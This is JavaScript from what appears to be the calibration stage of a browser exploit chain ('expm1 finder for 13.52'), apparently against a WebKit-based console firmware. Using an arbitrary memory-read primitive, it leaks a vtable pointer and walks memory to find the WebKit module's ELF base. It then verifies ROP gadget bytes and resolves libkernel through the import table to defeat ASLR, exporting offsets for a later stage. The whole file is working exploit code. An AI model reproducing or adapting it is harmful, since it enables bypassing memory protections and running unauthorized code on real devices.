    const delta = parseExpm1(expm1In && expm1In.value) || ASSUMED_EXPM1;
    if (!(delta > 0)) {
        mark("CAL-FAIL", "bad expm1");
        state("invalid expm1", "bad");
        return;
    }
    const base = manualBase || baseFromDelta(nativeFn, delta);
    if (!base) {
        mark("CAL-FAIL", "cannot compute base");
        return;
    }
    if (expm1In) expm1In.value = delta.toString(16);
    if (baseIn) baseIn.value = ptrNum(base).toString(16);
    try { sessionStorage.setItem(SS_CANDIDATE, delta.toString(16)); } catch (_) { }

    if (window.p) {
        const magic = read4p(window.p, base);
        mark("CAL-ELF-PEEK", "read4@base=" + base + " got=" + fmtMagic(magic)
            + " (want 0x464c457f at module start)");
        if (magic === ELF_MAGIC) {
            mark("CAL-ELF-PEEK", "ELF magic OK — 0x2582880 matches this nativeFn");
        } else if (isBadRead(magic)) {
            mark("CAL-WARN", "got " + fmtMagic(magic) + " at base — address wrong/unmapped");
            mark("HINT", "2582880 not confirmed — tap 2d Find base (walks back from nativeFn)");
        } else {
            mark("CAL-WARN", "got " + fmtMagic(magic) + " — not ELF, expm1 likely wrong");
        }
        applyCalibration(delta, base, null, 0, { assumed: true, elfPeek: magic });
    } else {
        applyCalibration(delta, base, null, 0, { assumed: true, elfPeek: null });
    }
    mark("HINT", "offsets live — use index_rw.html to peek webkitBase, or paste JSON");
    state("CAL-OK assumed — ready to test", "ok");
    setUi();
}

async function walkVtableForBase() {
    const p = window.p;
    const startPtr = ensureVtablePtr(p);
    if (!startPtr) {
        state("vtable leak failed", "bad");
        return false;
    }

    try { sessionStorage.removeItem(SS_VTABLE_FIND_I); } catch (_) { }

    mark("VTABLE-WALK", "auto walk from " + startPtr + " (max " + FIND_BASE_MAX_STEPS + " pages)");
    state("vtable walk 0/" + FIND_BASE_MAX_STEPS + "…", "warn");

    for (let step = 0; step < FIND_BASE_MAX_STEPS; step++) {
        const base = findBaseWalkAddr(startPtr, step);
        if (!base) {
            mark("CAL-FAIL", "vtable walk past valid range @ step " + step);
            state("vtable walk stopped", "bad");
            return false;
        }

        const magic = read4p(p, base);
        const n = step + 1;
        if (n === 1 || n % WALK_LOG_EVERY === 0 || magic === ELF_MAGIC) {
            mark("VTABLE-FIND", n + "/" + FIND_BASE_MAX_STEPS
                + " base=" + base + " got=" + fmtMagic(magic));
        }
        if (n % 32 === 0 || n === 1)
            state("vtable walk " + n + "/" + FIND_BASE_MAX_STEPS + "…", "warn");

        if (magic === ELF_MAGIC) {
            applyBaseFound(base, "vtable-walk");
            mark("NEXT", "Verify step to confirm gadgets (base from vtable, not expm1)");
            state("ELF found via vtable walk", "ok");
            return true;
        }

        if (WALK_YIELD_EVERY > 0 && n % WALK_YIELD_EVERY === 0)
            await new Promise(r => setTimeout(r, 0));
    }

    mark("CAL-FAIL", "vtable walk exhausted " + FIND_BASE_MAX_STEPS + " pages — no ELF");
    mark("HINT", "check VTABLE-OK line — try ?backmax=4096 or ?vtable=0 and manual base");
    state("vtable walk — no ELF", "bad");
    return false;
}

async function runFindBaseVtable() {
    if (busy || !ready || !window.p || !carrierRef) return;
    busy = true;
    setUi();
    preCalTrim();
    try {
        await walkVtableForBase();
    } finally {
        busy = false;
        setUi();
    }
}

async function runFindBase() {
    if (busy || !ready || !window.p || !nativeFn) return;
    busy = true;
    setUi();
    preCalTrim();

    let step = 0;
    try { step = parseInt(sessionStorage.getItem(SS_FIND_BASE_I) || "0", 10) || 0; } catch (_) { }

    if (step >= FIND_BASE_MAX_STEPS) {
        mark("CAL-FAIL", "find-base exhausted " + FIND_BASE_MAX_STEPS + " pages back");
        mark("HINT", "nativeFn may be wrong — check CAL-PATH-TRY lines; try ?pair=1 on Start");
        state("find-base done — no ELF", "bad");
        busy = false;
        setUi();
        return;
    }

    const base = findBaseWalkAddr(nativeFn, step);
    if (!base) {
        mark("CAL-FAIL", "find-base walked past valid range");
        state("find-base stopped", "bad");
        busy = false;
        setUi();
        return;
    }

    const delta = impliedExpm1FromBase(nativeFn, base);
    mark("FIND-BASE", (step + 1) + "/" + FIND_BASE_MAX_STEPS
        + " base=" + base + " expm1=0x" + delta.toString(16) + " (1 read)");

    try {
        await new Promise(r => setTimeout(r, 64));
        const magic = read4p(window.p, base);
        step++;
        try { sessionStorage.setItem(SS_FIND_BASE_I, String(step)); } catch (_) { }

        if (magic !== ELF_MAGIC) {
            const tag = isBadRead(magic) ? " (bad/unmapped)" : "";
            mark("ELF-MISS", fmtMagic(magic) + " @ " + base + tag);
            mark("HINT", "0xcccccccc = wrong address — keep tapping Find base");
            state("find-base " + step + "/" + FIND_BASE_MAX_STEPS + " — tap again", "warn");
            return;
        }

        try { sessionStorage.removeItem(SS_FIND_BASE_I); } catch (_) { }
        applyBaseFound(base, "nativeFn-walk");
        mark("NEXT", "Verify step to confirm gadgets");
        state("ELF found via walk-back", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

async function runProbeElf() {
    if (busy || !ready || !window.p || !nativeFn) return;
    busy = true;
    setUi();
    preCalTrim();

    let list = [];
    try {
        const n = parseInt(sessionStorage.getItem(SS_PROBE_LIST) || "0", 10) || 0;
        if (n > 0) list = probeAlignedDeltas(nativeFn).slice(0, n);
    } catch (_) { }
    if (list.length === 0) {
        list = probeAlignedDeltas(nativeFn);
        try { sessionStorage.setItem(SS_PROBE_LIST, String(list.length)); } catch (_) { }
    }

    let i = 0;
    try { i = parseInt(sessionStorage.getItem(SS_PROBE_I) || "0", 10) || 0; } catch (_) { }

    if (i >= list.length) {
        mark("CAL-FAIL", "probe exhausted " + list.length + " aligned deltas");
        mark("HINT", "try 2d Find base (walk back from nativeFn) or ?min=0x1e00000&max=0x2c00000");
        state("probe done — no ELF", "bad");
        busy = false;
        setUi();
        return;
    }

    const delta = list[i];
    const base = baseFromDelta(nativeFn, delta);
    mark("PROBE-TRY", (i + 1) + "/" + list.length + " expm1=0x" + delta.toString(16)
        + " base=" + base + " (1 read)");

    try {
        await new Promise(r => setTimeout(r, 64));
        const magic = read4p(window.p, base);
        i++;
        try { sessionStorage.setItem(SS_PROBE_I, String(i)); } catch (_) { }

        if (magic !== ELF_MAGIC) {
            mark("ELF-MISS", fmtMagic(magic) + " @ " + base
                + (magic === 0xcccccccc ? " (unmapped/wrong addr)" : ""));
            state("probe " + i + "/" + list.length + " — tap Probe ELF again", "warn");
            return;
        }

        applyElfHit(delta, base);
        mark("NEXT", "tap Verify step or Assume");
        state("ELF found — Verify or Assume", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

async function runVerifyStep() {
    if (busy || !ready || !window.p || !nativeFn) return;
    const base = activeBase();
    if (!base) {
        mark("CAL-FAIL", "no base — type expm1 or base, then Set");
        state("need expm1 or base", "bad");
        return;
    }
    const delta = activeDelta();

    busy = true;
    setUi();
    preCalTrim();

    const p = window.p;
    if (manualBase)
        mark("CAL-BASE-MODE", "manual base=" + base);
    else if (!(delta > 0)) {
        mark("CAL-FAIL", "no expm1 — lite scan or type hex first");
        state("need expm1 delta", "bad");
        busy = false;
        setUi();
        return;
    }

    let step = 0;
    try { step = parseInt(sessionStorage.getItem(SS_VSTEP) || "0", 10) || 0; } catch (_) { }
    try { verifyGadgetOk = parseInt(sessionStorage.getItem(SS_VGAD_OK) || "0", 10) || 0; } catch (_) { }

    const totalSteps = 1 + GADGET_CHECKS.length + 3;
    mark("VERIFY-STEP", (step + 1) + "/" + totalSteps
        + (delta > 0 ? " expm1=0x" + delta.toString(16) : "")
        + " base=" + base);
    state("verify " + (step + 1) + "/" + totalSteps + "…", "warn");

    try {
        await new Promise(r => setTimeout(r, 64));

        if (step === 0) {
            const magic = read4p(p, base);
            if (magic !== ELF_MAGIC) {
                clearVerifyProgress();
                mark("CAL-FAIL", "ELF @ base=" + base + " got=" + fmtMagic(magic)
                    + " want=0x464c457f");
                mark("HINT", "0x464c457f is what a READ returns at base — do not type it into expm1/base");
                mark("HINT", "tap Assume expm1 to skip verify and test with 0x2582880 anyway");
                const atGuess = read4p(p, baseFromDelta(nativeFn, suggestedExpm1(nativeFn, tableOff)));
                if (atGuess != null)
                    mark("HINT", "table-hint base got=" + fmtMagic(atGuess));
                state("ELF fail — use Probe ELF", "bad");
                return;
            }
            mark("CAL-ELF-OK", "base=" + base);
            try { sessionStorage.setItem(SS_VSTEP, "1"); } catch (_) { }
            mark("CAL-MORE", "tap Verify step (" + 2 + "/" + totalSteps + ")");
            return;
        }

        if (step >= 1 && step <= GADGET_CHECKS.length) {
            const gi = step - 1;
            const row = GADGET_CHECKS[gi];
            const name = row[0];
            const key = row[1];
            const pat = row[2];
            const rva = tableOff[key];
            if (rva == null) {
                mark("GADGET-SKIP", name + " (no rva in table)");
            } else if (checkGadgetBytes(p, base, rva, pat)) {
                verifyGadgetOk++;
                mark("GADGET-OK", name + " @+" + rva.toString(16));
            } else {
                mark("GADGET-BAD", name + " @+" + rva.toString(16));
            }
            try {
                sessionStorage.setItem(SS_VGAD_OK, String(verifyGadgetOk));
                sessionStorage.setItem(SS_VSTEP, String(step + 1));
            } catch (_) { }
            if (step + 1 <= GADGET_CHECKS.length)
                mark("CAL-MORE", "tap Verify step (" + (step + 2) + "/" + totalSteps + ")");
            else
                mark("CAL-MORE", "tap Verify step for libkernel (1 read/tap ×3)");
            return;
        }

        const lkStep = step - 1 - GADGET_CHECKS.length;
        if (!tableOff.wk___imp___error || !tableOff.k__error) {
            if (verifyGadgetOk >= 6) {
                applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
                    base, null, verifyGadgetOk);
            } else {
                mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length);
            }
            return;
        }

        if (lkStep === 0) {
            mark("LK-TRY", "1/3 IAT webkit+" + tableOff.wk___imp___error.toString(16));
            const errorFn = read8p(p, base.add32(tableOff.wk___imp___error));
            if (!errorFn) {
                clearLkProgress();
                mark("LK-FAIL", "IAT read failed");
                if (verifyGadgetOk >= 6)
                    applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
                        base, null, verifyGadgetOk);
                return;
            }
            try {
                sessionStorage.setItem(SS_LK_ERROR, String(errorFn));
                sessionStorage.setItem(SS_LK_STEP, "1");
                sessionStorage.setItem(SS_VSTEP, String(step + 1));
            } catch (_) { }
            mark("CAL-MORE", "tap Verify step (libkernel 2/3)");
            return;
        }

        const errorFn = parseAddr(sessionStorage.getItem(SS_LK_ERROR));
        const lk = errorFn ? errorFn.sub32(tableOff.k__error) : null;

        if (lkStep === 1) {
            mark("LK-TRY", "2/3 __error @ " + lk);
            const w0 = read4p(p, lk);
            if (w0 == null) {
                clearLkProgress();
                mark("LK-FAIL", "lk read failed");
                if (verifyGadgetOk >= 6)
                    applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
                        base, null, verifyGadgetOk);
                return;
            }
            try {
                sessionStorage.setItem(SS_LK_W0, "0x" + (w0 >>> 0).toString(16));
                sessionStorage.setItem(SS_LK_STEP, "2");
                sessionStorage.setItem(SS_VSTEP, String(step + 1));
            } catch (_) { }
            mark("CAL-MORE", "tap Verify step (libkernel 3/3)");
            return;
        }

        mark("LK-TRY", "3/3 verify prologue");
        const w0 = parseInt(sessionStorage.getItem(SS_LK_W0) || "0", 16);
        const w1 = read4p(p, lk.add32(4));
        clearLkProgress();

        let lkBase = null;
        if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
            lkBase = lk;
            mark("LK-OK", String(lk));
        } else {
            mark("LK-BAD", "prologue mismatch");
        }

        if (verifyGadgetOk >= 6) {
            applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
                base, lkBase, verifyGadgetOk);
        } else {
            mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length + " (need ≥6)");
            state("verify failed — wrong expm1?", "warn");
        }
    } finally {
        busy = false;
        setUi();
    }
}

function runCopy() {
    const block = lines.find(l => l.startsWith("PASTE-OFFSETS"));
    if (!block) return;
    const json = block.replace(/^PASTE-OFFSETS\s+/, "");
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(json).then(
            () => mark("COPY", "offsets JSON copied"),
            () => mark("COPY", "clipboard failed — copy from log")
        );
    } else {
        mark("COPY", "copy PASTE-OFFSETS line from log");
    }
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    resultEl = $("result");
    nativeFnEl = $("native-fn");
    baseEl = $("webkit-base");
    expm1In = $("expm1-in");
    baseIn = $("base-in");
    btnStart = $("btn-start");
    btnLite = $("btn-lite");
    btnWide = $("btn-wide");
    btnVerify = $("btn-verify");
    btnSetExpm1 = $("btn-set-expm1");
    btnSetBase = $("btn-set-base");
    btnAssume = $("btn-assume");
    btnVerify2 = $("btn-verify-2");
    btnSetExpm12 = $("btn-set-expm1-2");
    btnSetBase2 = $("btn-set-base-2");
    btnProbe = $("btn-probe");
    btnFindBase = $("btn-find-base");
    btnFindBaseVtable = $("btn-find-base-vtable");
    calBarEl = $("cal-bar");
    btnCopy = $("btn-copy");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnLite, function () { return runScanStep("lite"); });
    wireClick(btnWide, function () { return runScanStep("wide"); });
    wireClick(btnVerify, function () { return runVerifyStep(); });
    wireClick(btnVerify2, function () { return runVerifyStep(); });
    wireClick(btnSetExpm1, runSetExpm1);
    wireClick(btnSetExpm12, runSetExpm1);
    wireClick(btnSetBase, runSetBase);
    wireClick(btnSetBase2, runSetBase);
    wireClick(btnAssume, function () { runAssumeTest(false); });
    wireClick(btnProbe, function () { return runProbeElf(); });
    wireClick(btnFindBase, function () { return runFindBase(); });
    wireClick(btnFindBaseVtable, function () { return runFindBaseVtable(); });
    wireClick(btnCopy, runCopy);
    wireClick(btnClear, function () {
        lines.length = 0;
        if (outEl) outEl.textContent = "";
    });

    if (expm1In)
        expm1In.addEventListener("input", function () { updateResultPanel(); });
    if (baseIn)
        baseIn.addEventListener("input", function () { updateResultPanel(); });

    const cached = loadNativeFnOverride();
    if (cached) mark("BOOT", "cached nativeFn " + cached + " (Start refreshes live)");

    const pre = params.get("expm1");
    if (pre && expm1In) expm1In.value = pre.replace(/^0x/i, "");
    else if (expm1In) expm1In.value = ASSUMED_EXPM1.toString(16);

    const preBase = params.get("base");
    if (preBase && baseIn) {
        baseIn.value = preBase.replace(/^0x/i, "");
        manualBase = parseAddr(preBase);
    } else {
        manualBase = loadManualBaseOverride();
        if (manualBase && baseIn) baseIn.value = ptrNum(manualBase).toString(16);
    }

    mark("BOOT", "index_cal.html — expm1 finder for 13.52");
    mark("BOOT", groomBootLine());
    mark("BOOT", "2e vtable walk auto after Start (?vtable=0 to disable)");
    wireGroomBar();
    setUi();
    state("ready — pick groom if needed, then Start", "");
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
